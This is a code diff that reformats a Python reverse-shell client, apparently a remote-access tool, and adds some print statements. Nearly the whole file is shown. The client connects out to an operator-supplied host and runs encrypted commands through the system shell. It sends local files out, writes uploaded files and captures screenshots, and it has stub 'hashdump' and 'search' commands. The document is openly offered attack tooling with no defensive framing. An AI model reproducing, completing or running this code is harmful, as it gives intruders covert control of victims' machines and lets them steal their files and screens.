@@ -6,6 +6,7 @@ from aes_crypt import AESCipher
 from time import sleep
 from PIL import ImageGrab
 
+
 class ReverseShellClient:
     def __init__(self, host, port):
         self.host = host
@@ -25,15 +26,15 @@ class ReverseShellClient:
     def listen_for_commands(self):
         try:
             while True:
-                data = self.conn.recv(4096).decode('utf-8')
+                data = self.conn.recv(4096).decode("utf-8")
                 if not data:
                     break
                 decrypted_data = AESCipher.decrypt(data)
-                if decrypted_data.lower() == 'exit':
+                if decrypted_data.lower() == "exit":
                     break
-                elif decrypted_data.startswith('download'):
+                elif decrypted_data.startswith("download"):
                     self.handle_download(decrypted_data)
-                elif decrypted_data.startswith('upload'):
+                elif decrypted_data.startswith("upload"):
                     self.handle_upload(decrypted_data)
                 else:
                     self.execute_command(decrypted_data)
@@ -41,50 +42,60 @@ class ReverseShellClient:
             self.conn.close()
 
     def handle_download(self, command):
-        file_path = command.split(' ', 1)[1]
+        file_path = command.split(" ", 1)[1]
         try:
-            with open(file_path, 'rb') as f:
+            with open(file_path, "rb") as f:
                 while True:
                     chunk = f.read(4096)
                     if not chunk:
                         break
-                    self.conn.send(AESCipher.encrypt(b64encode(chunk).decode('utf-8')).encode('utf-8'))
-            self.conn.send(AESCipher.encrypt('EOF').encode('utf-8'))
+                    self.conn.send(
+                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
+                            "utf-8"
+                        )
+                    )
+            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
         except Exception as e:
-            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode('utf-8'))
+            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
 
     def handle_upload(self, command):
-        file_path = command.split(' ', 1)[1]
+        file_path = command.split(" ", 1)[1]
         try:
-            with open(file_path, 'wb') as f:
+            with open(file_path, "wb") as f:
                 while True:
-                    data = self.conn.recv(4096).decode('utf-8')
+                    data = self.conn.recv(4096).decode("utf-8")
                     decrypted_data = AESCipher.decrypt(data)
-                    if decrypted_data == 'EOF':
+                    if decrypted_data == "EOF":
                         break
                     f.write(b64decode(decrypted_data))
+            print(f"File {file_path} uploaded successfully.")
         except Exception as e:
-            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode('utf-8'))
+            print(f"Failed to upload {file_path}: {e}")
+            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
 
     def execute_command(self, command):
-        if command.startswith('ipconfig'):
-            result = self.run_system_command("ipconfig" if os.name == 'nt' else "ifconfig")
-        elif command.startswith('screenshot'):
+        if command.startswith("ipconfig"):
+            result = self.run_system_command(
+                "ipconfig" if os.name == "nt" else "ifconfig"
+            )
+        elif command.startswith("screenshot"):
             result = self.take_screenshot()
-        elif command.startswith('search'):
+        elif command.startswith("search"):
             # handle search
             result = "Search functionality not implemented."
-        elif command.startswith('hashdump'):
+        elif command.startswith("hashdump"):
             # handle hashdump
             result = "Hashdump functionality not implemented."
         else:
             result = self.run_system_command(command)
-        self.conn.send(AESCipher.encrypt(result).encode('utf-8'))
+        self.conn.send(AESCipher.encrypt(result).encode("utf-8"))
 
     def run_system_command(self, command):
         try:
-            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-            return output.decode('utf-8')
+            output = subprocess.check_output(
+                command, shell=True, stderr=subprocess.STDOUT
+            )
+            return output.decode("utf-8")
         except subprocess.CalledProcessError as e:
             return str(e)
 
@@ -92,9 +103,10 @@ class ReverseShellClient:
         screenshot = ImageGrab.grab()
         screenshot.save("screenshot.png")
         with open("screenshot.png", "rb") as f:
-            return b64encode(f.read()).decode('utf-8')
+            return b64encode(f.read()).decode("utf-8")
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     if len(sys.argv) != 3:
         print("Usage: python reverse_shell.py <HOST> <PORT>")
         sys.exit(1)
